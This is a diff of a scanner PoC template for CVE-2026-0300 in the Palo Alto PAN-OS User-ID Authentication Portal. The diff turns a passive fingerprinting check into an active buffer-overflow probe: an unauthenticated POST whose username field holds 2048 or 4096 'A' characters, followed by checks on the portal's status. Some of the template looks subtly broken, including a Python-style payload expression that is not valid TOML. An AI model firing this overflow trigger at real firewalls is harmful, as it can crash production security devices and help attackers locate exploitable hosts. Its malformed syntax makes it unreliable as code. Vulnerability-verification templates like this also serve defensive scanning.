@@ -1,33 +1,51 @@
 [info]
 id = "POC-AVE-2026-0075"
-name = "Palo Alto Networks PAN-OS User-ID 认证门户缓冲区溢出检测"
+name = "Palo Alto Networks PAN-OS User-ID Authentication Portal 缓冲区溢出 PoC"
 author = "AVE"
 severity = "critical"
-tags = ["buffer-overflow", "rce", "pan-os", "captive-portal"]
-description = "检测 Palo Alto Networks PAN-OS User-ID™ 认证门户（Captive Portal）服务是否存在，验证 CVE-2026-0300 缓冲区溢出漏洞的攻击面"
+tags = ["rce", "buffer-overflow", "pan-os"]
+description = "Palo Alto Networks PAN-OS User-ID Authentication Portal (Captive Portal) 服务存在缓冲区溢出漏洞（CWE-787），未经身份验证的攻击者通过发送特制 HTTP POST 请求可导致栈溢出并在目标系统上以 root 权限执行任意代码。该漏洞在 CISA KEV 中标记为已活跃利用，默认监听端口 6082。"
 vuln_id = ["CVE-2026-0300", "AVE-2026-0075"]
 
 [poc]
 logic = "any"
 
 [[poc.requests]]
-method = "GET"
-path = "/auth"
+method = "POST"
+path = "/"
+
+headers.Content-Type = "application/x-www-form-urlencoded"
 headers.Host = "{{hostname}}"
+headers.Connection = "close"
+
+body.type = "raw"
+body.content = "username={{payload}}&password=test&auth_type=local"
+
+[poc.payloads]
+payload = ["A"*2048, "A"*4096]
+
+[[poc.requests.matchers]]
+type = "status"
+status = [500, 502, 503]
+expect = false
 
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["User-ID", "Authentication Portal", "Captive Portal", "PAN-OS", "Palo Alto"]
-expect = true
+words = ["success", "authenticated"]
+expect = false
 
 [[poc.requests]]
 method = "GET"
-path = "/"
-headers.Host = "{{hostname}}"
+path = "/auth/status"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
 
 [[poc.requests.matchers]]
 type = "word"
 part = "body"
-words = ["User-ID", "Authentication Portal", "Captive Portal", "PAN-OS", "Palo Alto"]
+words = ["portal", "User-ID", "captive", "Authentication"]
 expect = true
